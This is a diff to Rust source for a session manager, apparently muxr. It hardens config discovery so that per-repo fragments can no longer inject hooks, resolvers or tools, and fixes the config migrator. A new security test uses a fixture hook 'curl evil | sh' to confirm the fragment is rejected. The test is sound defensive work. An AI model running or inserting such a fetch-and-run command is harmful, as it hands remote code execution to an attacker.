@@ -571,17 +571,30 @@ const FRAGMENT_MIGRATIONS: &[(&str, &str)] = &[("harnesses", "repos"), ("compani
 pub fn migrate_fragment(content: &str) -> (String, Vec<String>) {
     let mut changes = Vec::new();
     let mut has_schema = false;
+    // Track whether the current line BEGINS inside a multi-line string (`"""` or
+    // `'''`), so a `[header]`-looking CONTENT line inside one is never rewritten
+    // and a `schema_version = ...` inside one is not mistaken for the real key.
+    let mut in_multiline = false;
     let mut out: Vec<String> = Vec::new();
     for line in content.lines() {
-        if line.trim_start().starts_with("schema_version") {
-            has_schema = true;
+        let starts_inside = in_multiline;
+        // Odd number of triple-quote delimiters on this line flips the state.
+        if (line.matches("\"\"\"").count() + line.matches("'''").count()) % 2 == 1 {
+            in_multiline = !in_multiline;
         }
-        if let Some(new_line) = migrate_header_line(line) {
-            changes.push(format!("- {line}\n+ {new_line}"));
-            out.push(new_line);
-        } else {
-            out.push(line.to_string());
+        if !starts_inside {
+            if let Some(rest) = line.trim_start().strip_prefix("schema_version")
+                && rest.trim_start().starts_with('=')
+            {
+                has_schema = true; // a real top-level `schema_version =` key
+            }
+            if let Some(new_line) = migrate_header_line(line) {
+                changes.push(format!("- {line}\n+ {new_line}"));
+                out.push(new_line);
+                continue;
+            }
         }
+        out.push(line.to_string());
     }
     let mut new_content = out.join("\n");
     if content.ends_with('\n') {
@@ -956,43 +969,6 @@ fn resolve_state_path(
     home.join(".local").join("state").join("muxr").join("state.json")
 }
 
-/// Compiled default discovery roots: the namespace parents muxr scans for
-/// per-repo `muxr.toml` fragments when a config declares no explicit
-/// `[discovery].roots`. Deliberately estate-neutral so a fresh machine with a
-/// bootstrap-only config still self-discovers its harnesses -- zero per-machine
-/// config to drift (the "machine residue -> zero files" goal). `MUXR_ROOTS`
-/// overrides these. See `resolve_discovery_roots`.
-const DEFAULT_DISCOVERY_ROOTS: &[&str] = &["~/gitlab.com", "~/github.com"];
-
-/// Resolve the effective discovery roots. Pure (env read by the caller) so it is
-/// testable without mutating process env, mirroring `resolve_config_path`.
-/// Precedence:
-///   1. `MUXR_ROOTS` (non-empty; colon-separated) -- an explicit override for
-///      fixtures/tests and unusual layouts, like `MUXR_CONFIG`/`MUXR_STATE`.
-///   2. explicit `[discovery].roots` in the config.
-///   3. the compiled `DEFAULT_DISCOVERY_ROOTS` (so a bootstrap-only config still
-///      discovers -- new in 4.0.0; pre-4.0 a config without `[discovery]` did no
-///      discovery at all).
-///
-/// Only reached on the real `load()` path; unit tests drive `discover_and_merge`
-/// directly with explicit roots, so this never perturbs a hermetic fixture.
-fn resolve_discovery_roots(config_roots: &[String], env_override: Option<String>) -> Vec<String> {
-    if let Some(raw) = env_override.filter(|s| !s.is_empty()) {
-        return raw
-            .split(':')
-            .filter(|s| !s.is_empty())
-            .map(str::to_string)
-            .collect();
-    }
-    if !config_roots.is_empty() {
-        return config_roots.to_vec();
-    }
-    DEFAULT_DISCOVERY_ROOTS
-        .iter()
-        .map(|s| (*s).to_string())
-        .collect()
-}
-
 /// Slug a `<repo>/<campaign>` session name into a flat, filesystem-safe token
 /// for the recycle sentinel filename: any char that is not ASCII-alphanumeric
 /// or a hyphen (the slash included) becomes a hyphen. Session parts are
@@ -1032,8 +1008,9 @@ impl Remote {
 /// cannot parse it safely, so we fail loud (see `check_schema_version`) rather
 /// than let the strict parse surface a cryptic unknown-field error. Bump this
 /// in lockstep with any BREAKING schema change. Bumped to 2 in v4.0.0 (the
-/// breaking release: readiness removed, per-repo scoping, `viewer` -> `viewer`),
-/// so a v4 fragment may declare `schema_version = 2`. Absent `schema_version` in a
+/// breaking release: readiness removed, `companion` -> `viewer`, state relocated,
+/// upgrade de-gated), so a v4 fragment may declare `schema_version = 2`. Absent
+/// `schema_version` in a
 /// config is treated as this value -- the current baseline -- so existing
 /// unversioned configs are fine.
 pub const MAX_SCHEMA_VERSION: u32 = 2;
@@ -1080,13 +1057,6 @@ impl Config {
         }
         let content = crate::primitives::read_text(&path)?;
         let mut config = Self::parse(&content, &path.display().to_string())?;
-        // Fill in the effective discovery roots (MUXR_ROOTS / compiled defaults)
-        // before the walk, so a bootstrap-only config still self-discovers its
-        // harnesses with zero per-machine `[discovery]`. Done here (not in
-        // `discover_and_merge`) so unit tests that drive the merge directly stay
-        // hermetic -- they set explicit roots and never touch the defaults.
-        config.discovery.roots =
-            resolve_discovery_roots(&config.discovery.roots, std::env::var("MUXR_ROOTS").ok());
         config.discover_and_merge()?;
         Ok(config)
     }
@@ -1164,19 +1134,17 @@ impl Config {
     /// absent on this machine is simply not discovered. Fragments are merged in
     /// sorted path order for determinism.
     ///
-    /// A fragment contributes its `repos`/`remotes` (a duplicate name is a hard
-    /// error) PLUS the per-repo scoping fields that must travel with the repo so
-    /// a bootstrap-only machine is fully configured (ADR [f]/§9):
-    /// `hooks`/`extensions.resolver`/`session_env`/`tools`. These PRE-MERGE up
-    /// into the single effective config -- downstream lookups
-    /// (`run_pre_create_hooks`, `extensions.resolver`, `session_env_for`,
-    /// `tool_for`) take no repo parameter, so the merge, not a threaded arg, is
-    /// what makes them per-repo-sourced. `hooks` union (dedup, so a repo
-    /// redeclaring `muxr-setup` never runs it twice); resolver/session_env/tools
-    /// are first-wins (machine-global config, then sorted-first fragment) --
-    /// fragments are expected to declare identical bootstrap singletons. Any
-    /// OTHER top-level key is ineffective across the boundary and is a HARD
-    /// ERROR (v4.0.0; P2 only warned).
+    /// A fragment contributes ONLY its `repos`/`remotes` (a duplicate name is a
+    /// hard error). It deliberately does NOT carry the auto-exec-adjacent config
+    /// -- `hooks`/`extensions.resolver`/`tools`/`session_env` stay in the
+    /// operator-owned bootstrap config (which travels via the operator layer, so
+    /// there is no per-machine drift) and are NEVER sourced from a discovered
+    /// fragment: otherwise a `muxr.toml` in any cloned repo under a discovery root
+    /// could inject a `pre_create` / resolver `sh -c` command or a `[tools.*].bin`
+    /// that runs on the next session open (v4 P3-10 security review; supersedes the
+    /// earlier decision [f] to move those fields per-fragment). Any top-level key
+    /// other than `repos`/`remotes`/`schema_version` is a HARD ERROR (v4.0.0; P2
+    /// only warned) -- fail loud on a present-but-ineffective/unsafe block.
     fn discover_and_merge(&mut self) -> Result<()> {
         if self.discovery.roots.is_empty() {
             return Ok(());
@@ -1220,28 +1188,16 @@ impl Config {
             let source = fragment.display().to_string();
             let content = crate::primitives::read_text(fragment)?;
             let parsed = Self::parse_fragment(&content, &source)?;
-            // A fragment contributes repos/remotes PLUS the per-repo scoping
-            // fields (hooks/extensions/session_env/tools). Any OTHER top-level
-            // key parsed fine (it's a known Config field) but is INEFFECTIVE
-            // across the discovery boundary -- so it is a HARD ERROR (v4.0.0;
-            // P2 warned first, this is the breaking flip). Fail loud on
-            // present-but-ineffective rather than silently dropping a
-            // mistakenly-placed [layout]/[chooser]/... block.
+            // A fragment contributes ONLY repos/remotes. Any OTHER top-level key
+            // parsed fine (it's a known Config field) but is INEFFECTIVE OR UNSAFE
+            // across the discovery boundary -- so it is a HARD ERROR (v4.0.0; P2
+            // warned first). This is what keeps auto-exec-adjacent config
+            // (hooks/extensions/tools/session_env) OUT of a discovered fragment --
+            // those belong in the operator-owned bootstrap only (P3-10 security).
             if let Ok(table) = toml::from_str::<toml::Table>(&content) {
                 let offenders: Vec<&String> = table
                     .keys()
-                    .filter(|key| {
-                        !matches!(
-                            key.as_str(),
-                            "repos"
-                                | "remotes"
-                                | "schema_version"
-                                | "hooks"
-                                | "extensions"
-                                | "session_env"
-                                | "tools"
-                        )
-                    })
+                    .filter(|key| !matches!(key.as_str(), "repos" | "remotes" | "schema_version"))
                     .collect();
                 if !offenders.is_empty() {
                     let keys = offenders
@@ -1251,8 +1207,9 @@ impl Config {
                         .join(", ");
                     anyhow::bail!(
                         "fragment {source}: top-level {keys} not allowed in a fragment -- \
-                         a fragment contributes only [repos.*], [remotes.*], [hooks], \
-                         [extensions], [session_env] and [tools.*]"
+                         a fragment contributes only [repos.*] and [remotes.*] (hooks, \
+                         extensions, tools and session_env live in the operator-owned \
+                         config, never a discovered fragment)"
                     );
                 }
             }
@@ -1273,31 +1230,6 @@ impl Config {
                     );
                 }
                 self.remotes.insert(name, remote);
-            }
-            // Per-repo scoping fields PRE-MERGE into the single effective config
-            // (ADR [f]): hooks union (dedup), resolver/session_env/tools
-            // first-wins. This is what makes hooks/resolver/session_env/tools
-            // per-repo-sourced WITHOUT threading a repo param through
-            // `run_pre_create_hooks`/`extensions.resolver`/`session_env_for`/
-            // `tool_for`.
-            for cmd in parsed.hooks.pre_create {
-                if !self.hooks.pre_create.contains(&cmd) {
-                    self.hooks.pre_create.push(cmd);
-                }
-            }
-            for entry in parsed.hooks.path {
-                if !self.hooks.path.contains(&entry) {
-                    self.hooks.path.push(entry);
-                }
-            }
-            if self.extensions.resolver.is_none() {
-                self.extensions.resolver = parsed.extensions.resolver;
-            }
-            for (key, value) in parsed.session_env {
-                self.session_env.entry(key).or_insert(value);
-            }
-            for (name, tool) in parsed.tools {
-                self.tools.entry(name).or_insert(tool);
             }
         }
 
@@ -2845,106 +2777,26 @@ prompt_mode = "string"
     }
 
     #[test]
-    fn resolve_discovery_roots_precedence() {
-        // MUXR_ROOTS wins (colon-separated, empties dropped).
-        assert_eq!(
-            resolve_discovery_roots(&["~/x".into()], Some("~/a:~/b".into())),
-            vec!["~/a".to_string(), "~/b".to_string()]
-        );
-        // Empty MUXR_ROOTS is ignored -> explicit config roots.
-        assert_eq!(
-            resolve_discovery_roots(&["~/x".into()], Some(String::new())),
-            vec!["~/x".to_string()]
-        );
-        assert_eq!(
-            resolve_discovery_roots(&["~/x".into()], None),
-            vec!["~/x".to_string()]
-        );
-        // No config roots + no env -> compiled estate-neutral defaults.
-        assert_eq!(
-            resolve_discovery_roots(&[], None),
-            vec!["~/gitlab.com".to_string(), "~/github.com".to_string()]
-        );
-    }
-
-    #[test]
-    fn discovery_premerges_scoping_fields() {
-        // A fragment carries the per-repo scoping fields (hooks / resolver /
-        // session_env / tools); discovery pre-merges them into the single
-        // effective config so downstream lookups need no repo param (ADR [f]).
-        let root = tempfile::tempdir().unwrap();
-        let repo_a = root.path().join("ns").join("repoA");
-        std::fs::create_dir_all(repo_a.join(".git")).unwrap();
-        std::fs::write(
-            repo_a.join("muxr.toml"),
-            "[repos.alpha]\ndir = \"~/a\"\ncolor = \"#123456\"\n\n\
-             [hooks]\npre_create = [\"muxr-setup\"]\n\n\
-             [extensions]\nresolver = \"muxr-resolver\"\n\n\
-             [session_env]\nFOO = \"{session_slug}\"\n\n\
-             [tools.pi]\nbin = \"pi\"\nprompt_mode = \"string\"\n",
-        )
-        .unwrap();
-        // A second fragment redeclares the SAME hook -> the union must not dup it.
-        let repo_b = root.path().join("ns").join("repoB");
-        std::fs::create_dir_all(repo_b.join(".git")).unwrap();
-        std::fs::write(
-            repo_b.join("muxr.toml"),
-            "[repos.beta]\ndir = \"~/b\"\ncolor = \"#654321\"\n\n\
-             [hooks]\npre_create = [\"muxr-setup\"]\n",
-        )
-        .unwrap();
-
-        let mut config = Config::parse("[repos]\n", "<test>").unwrap();
-        config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
-        config.discover_and_merge().unwrap();
-
-        assert_eq!(
-            config.hooks.pre_create,
-            vec!["muxr-setup".to_string()],
-            "hook unioned across fragments, no duplicate"
-        );
-        assert_eq!(config.extensions.resolver.as_deref(), Some("muxr-resolver"));
-        assert_eq!(
-            config.session_env.get("FOO").map(String::as_str),
-            Some("{session_slug}"),
-            "session_env value stored raw (interpolated later)"
-        );
-        assert!(config.tool_for("pi").is_some(), "fragment tool merged");
-    }
-
-    #[test]
-    fn discovery_global_scoping_wins_over_fragment() {
-        // First-wins: a value already in the machine-global config is NOT
-        // overwritten by a fragment (the fragment fills gaps, doesn't clobber).
+    fn discovery_rejects_exec_fields_in_fragment() {
+        // SECURITY (P3-10): a discovered fragment must NOT be able to inject
+        // auto-exec config. `[hooks]` (run via `sh -c` on session open) in a
+        // fragment is a HARD ERROR -- hooks/extensions/tools/session_env live in
+        // the operator-owned bootstrap only, never a discovered muxr.toml.
         let root = tempfile::tempdir().unwrap();
         let repo = root.path().join("ns").join("repoA");
         std::fs::create_dir_all(repo.join(".git")).unwrap();
         std::fs::write(
             repo.join("muxr.toml"),
             "[repos.alpha]\ndir = \"~/a\"\ncolor = \"#123456\"\n\n\
-             [extensions]\nresolver = \"fragment-resolver\"\n\n\
-             [session_env]\nFOO = \"from-fragment\"\n",
+             [hooks]\npre_create = [\"curl evil | sh\"]\n",
         )
         .unwrap();
-
-        let mut config = Config::parse(
-            "[repos]\n\n[extensions]\nresolver = \"global-resolver\"\n\n\
-             [session_env]\nFOO = \"from-global\"\n",
-            "<test>",
-        )
-        .unwrap();
+        let mut config = Config::parse("[repos]\n", "<test>").unwrap();
         config.discovery.roots = vec![root.path().to_string_lossy().into_owned()];
-        config.discover_and_merge().unwrap();
-
-        assert_eq!(
-            config.extensions.resolver.as_deref(),
-            Some("global-resolver"),
-            "global resolver wins (first-wins)"
-        );
-        assert_eq!(
-            config.session_env.get("FOO").map(String::as_str),
-            Some("from-global"),
-            "global session_env key wins (first-wins)"
+        let err = config.discover_and_merge().unwrap_err().to_string();
+        assert!(
+            err.contains("`hooks`") && err.contains("not allowed"),
+            "a fragment carrying [hooks] must be rejected: {err}"
         );
     }
 
@@ -3016,6 +2868,25 @@ prompt_mode = "string"
         let (out, changes) = migrate_fragment(src);
         assert!(changes.is_empty(), "already current: {changes:?}");
         assert_eq!(out, src, "content unchanged");
+    }
+
+    #[test]
+    fn migrate_fragment_skips_multiline_string_content() {
+        // A `[companion]`-looking CONTENT line inside a multi-line string must NOT
+        // be rewritten (data-loss guard), while a real table header outside it is.
+        let src = "[repos.work]\ndir = \"~/w\"\ncolor = \"#fff\"\n\n\
+                   [repos.work.ext]\nnote = \"\"\"\n[companion]\n\"\"\"\n\n\
+                   [repos.work.companion]\ncmd = \"v\"\n";
+        let (out, _) = migrate_fragment(src);
+        assert_eq!(
+            out.matches("[companion]").count(),
+            1,
+            "the string-body [companion] is preserved, only the real header renamed: {out}"
+        );
+        assert!(
+            out.contains("[repos.work.viewer]"),
+            "the real table header IS migrated: {out}"
+        );
     }
 
     #[test]
